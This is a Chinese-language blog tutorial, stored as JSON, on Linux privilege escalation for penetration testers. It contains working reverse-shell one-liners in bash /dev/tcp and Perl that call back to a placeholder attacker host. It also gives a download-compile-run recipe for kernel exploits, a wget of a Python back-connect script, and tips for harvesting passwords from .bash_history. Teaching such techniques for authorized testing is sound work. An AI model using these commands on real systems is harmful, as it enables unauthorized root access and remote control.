{"title":"提权(二)-Linux系统","slug":"提权-二-Linux系统","date":"2018-09-25T09:47:28.000Z","updated":"2018-09-25T14:47:47.279Z","comments":true,"path":"api/articles/提权-二-Linux系统.json","photos":[],"link":"","excerpt":"前情提要linun提权和上一章win提权很相似，套路差不多。下图是提权总结，Linux系统提权大致分这么多模块。 [Figure] Linux 提权基础","covers":["https://bj.bcebos.com/v1/image-langke/img_hexo/linux_zongjie.png","https://bj.bcebos.com/v1/image-langke/img_hexo/bash_shell.png","https://bj.bcebos.com/v1/image-langke/img_hexo/linux-exploit-suggester.png","https://bj.bcebos.com/v1/image-langke/img_hexo/history_bash.png","https://bj.bcebos.com/v1/image-langke/img_hexo/Startup_item.png"],"content":"<h5 id=\"前情提要\"><a href=\"#前情提要\" class=\"headerlink\" title=\"前情提要\"></a>前情提要</h5><ul>\n<li>linun提权和上一章win提权很相似，套路差不多。</li>\n<li>下图是提权总结，Linux系统提权大致分这么多模块。</li>\n</ul>\n<p><img src=\"https://bj.bcebos.com/v1/image-langke/img_hexo/linux_zongjie.png\" alt=\"Linux总结\"></p>\n<h2 id=\"Linux-提权基础\"><a href=\"#Linux-提权基础\" class=\"headerlink\" title=\"Linux 提权基础\"></a>Linux 提权基础</h2><a id=\"more\"></a>\n<blockquote>\n<h5 id=\"基础命令\"><a href=\"#基础命令\" class=\"headerlink\" title=\"基础命令\"></a>基础命令</h5><blockquote>\n<p><code>uname -an</code>  <strong>查看系统信息</strong><br><code>id</code>  <strong>查看当前用户权限</strong><br><code>pwd</code> <strong>查看当前目录路径</strong><br><code>cat /etc/issue</code> <strong>查看内核信息</strong></p>\n</blockquote>\n<h5 id=\"套路\"><a href=\"#套路\" class=\"headerlink\" title=\"套路\"></a>套路</h5><blockquote>\n<p><code>wget http://exp/exp.c</code> <strong>下载对应漏洞的EXP二进制文件</strong><br><code>gcc -o exp exp.c</code> <strong>用系统命令gcc编译EXP</strong><br><code>chmod +x exp</code> <strong>给exp增加执行权限</strong><br><code>./exp</code> <strong>执行编译好的exp文件</strong><br><code>...到root</code> <strong>你懂的</strong></p>\n</blockquote>\n<h5 id=\"反弹shell\"><a href=\"#反弹shell\" class=\"headerlink\" title=\"反弹shell\"></a>反弹shell</h5><blockquote>\n<p>本地监听 <code>nc -lvp 端口</code><br>目标机反弹有下面几种：</p>\n<blockquote>\n<p>一、<code>/bin/bash -i &gt; /dev/tcp/本地ip/端口 0&lt;&amp;1 2&gt;&amp;1</code><br><img src=\"https://bj.bcebos.com/v1/image-langke/img_hexo/bash_shell.png\" alt=\"bash_shell\"><br>二、<code>perl -e &#39;use Socket;$i=&quot;本地ip&quot;;$p=端口;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/bash -i&quot;);};&#39;</code><br>三、上传<code>python</code>脚本并执行，来反弹shell。<br>》<a href=\"https://github.com/wantongtang/pyshell\" target=\"_blank\" rel=\"noopener\">用法</a>《<br>下载命令：<code>wget https://raw.githubusercontent.com/wantongtang/pyshell/master/back.py</code><br><code>python back.py 192.168.1.100 666</code></p>\n</blockquote>\n</blockquote>\n</blockquote>\n<h2 id=\"linux分析工具\"><a href=\"#linux分析工具\" class=\"headerlink\" title=\"linux分析工具\"></a>linux分析工具</h2><h3 id=\"1-linux-exploit-suggester-sh\"><a href=\"#1-linux-exploit-suggester-sh\" class=\"headerlink\" title=\"1.linux-exploit-suggester.sh\"></a>1.linux-exploit-suggester.sh</h3><blockquote>\n<ul>\n<li><a href=\"https://github.com/mzet-/linux-exploit-suggester\" target=\"_blank\" rel=\"noopener\"><strong>用法</strong></a></li>\n<li><a href=\"https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh\" target=\"_blank\" rel=\"noopener\"><strong>文件地址</strong></a></li>\n<li><strong>下载命令</strong>：<code>wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh</code></li>\n<li><strong>执行命令</strong> <code>./les.sh</code><br><img src=\"https://bj.bcebos.com/v1/image-langke/img_hexo/linux-exploit-suggester.png\" alt=\"linux_fenxi\" title=\"linux分析工具\"></li>\n</ul>\n</blockquote>\n<h2 id=\"历史纪录提权\"><a href=\"#历史纪录提权\" class=\"headerlink\" title=\"历史纪录提权\"></a>历史纪录提权</h2><blockquote>\n<p>命令及演示步骤</p>\n<blockquote>\n<p><code>cd</code><br><code>ls -al</code><br><code>cat .bash_history</code><br><img src=\"https://bj.bcebos.com/v1/image-langke/img_hexo/history_bash.png\" alt=\"历史命令列表\"><br>    可以从历史命令里面获取一些信息，比如根据命令猜测有哪些应用。管理员可能会在命令行修改一些配置文件，连接数据库的时候，还有可能明文输入密码等。</p>\n</blockquote>\n</blockquote>\n<h2 id=\"启动项提权\"><a href=\"#启动项提权\" class=\"headerlink\" title=\"启动项提权\"></a>启动项提权</h2><blockquote>\n<p>命令及演示</p>\n<blockquote>\n<p><code>cat /etc/crontab</code><br><img src=\"https://bj.bcebos.com/v1/image-langke/img_hexo/Startup_item.png\" alt=\"startup_item\"><br>条件很苛刻，项目中很少遇到，不做过多介绍。</p>\n</blockquote>\n</blockquote>\n<h5 id=\"写在后面的话\"><a href=\"#写在后面的话\" class=\"headerlink\" title=\"写在后面的话\"></a><strong>写在后面的话</strong></h5><ul>\n<li>linux提权过程中，以CVE漏洞为主。</li>\n</ul>\n","categories":[],"tags":[{"name":"Equity","slug":"Equity","count":2,"path":"api/tags/Equity.json"}]}